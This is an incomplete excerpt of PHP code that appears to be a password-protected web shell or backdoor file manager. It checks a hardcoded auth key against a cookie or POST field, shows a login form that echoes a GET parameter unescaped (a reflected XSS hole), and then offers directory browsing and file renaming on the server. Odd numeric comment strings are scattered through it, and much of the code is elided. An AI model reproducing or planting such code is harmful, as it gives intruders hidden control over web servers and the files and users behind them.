...
$auth_key = "f6e6e5d64605b0af7dfd64aa892070fa";
...
$pass = false;
if (isset($_COOKIE['pw_name_63387'])) {
    if(($_COOKIE['pw_name_63387']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_63387'])) {
        if(($_POST['pw_name_63387']) == $auth_key) {
            setcookie("pw_name_63387", $_POST['pw_name_63387']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_63387' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1723903273754175 1723903273767497 1723903273390681 1723903273631771
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1723903273754175 1723903273767497 1723903273390681 1723903273631771
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1723903273754175 1723903273767497 1723903273390681 1723903273631771
            $name = PATH . "/" . $_GET['r'];
